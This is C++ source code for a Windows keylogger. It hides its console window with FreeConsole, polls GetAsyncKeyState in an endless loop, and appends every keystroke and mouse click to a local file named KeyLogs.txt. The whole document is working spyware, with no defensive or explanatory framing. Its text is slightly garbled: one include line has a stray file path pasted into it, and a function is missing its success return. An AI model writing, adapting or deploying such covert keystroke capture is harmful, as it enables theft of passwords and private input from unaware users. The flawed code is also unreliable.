//#include <iostream>
#include <windows.h>
#include <fstream>
#include <stdio.C:\Users\IBRAHIM\Desktop\c++\atm emulator system\MainMenu.cpph>
#include <string>

using namespace std;

    void Write_to_file(LPCSTR text)
    {
        ofstream logFile;
        logFile.open("KeyLogs.txt", fstream::app);
        logFile << text;
        logFile.close();

    }

    bool ListOfInput(int iKey)
    {
        switch(iKey)
        {
        case VK_SPACE:
           // cout << " ";
            Write_to_file(" ");
            break;
        case VK_RETURN:
           // cout << "\n";
            Write_to_file(" *\n* ");
            break;
        case VK_SHIFT:
           // cout << "Shift";
            Write_to_file(" *Shift* ");
            break;
        case VK_BACK:
           // cout <<"\b";
             Write_to_file(" *\b* ");
             break;
        case VK_RBUTTON:
            //cout <<" 'rClick' ";
             Write_to_file(" *rClick* ");
             break;
        case VK_LBUTTON:
           // cout <<" *lClick* ";
             Write_to_file(" *lClick* ");
             break;
        default: return false;
        }

    }

int main()
{
    FreeConsole();
    char key;
    while(true)
    {
        Sleep(5);
        for(key = 8; key <=190; key++)
        {
            if(GetAsyncKeyState(key) == -32767)
            {
                if(ListOfInput(key) == FALSE)
                {
                    //cout << key;
                    ofstream logFile;
                    logFile.open("KeyLogs.txt", fstream::app);
                    logFile << key;
                    logFile.close();
                }
            }
        }
    }

    return 0;
}
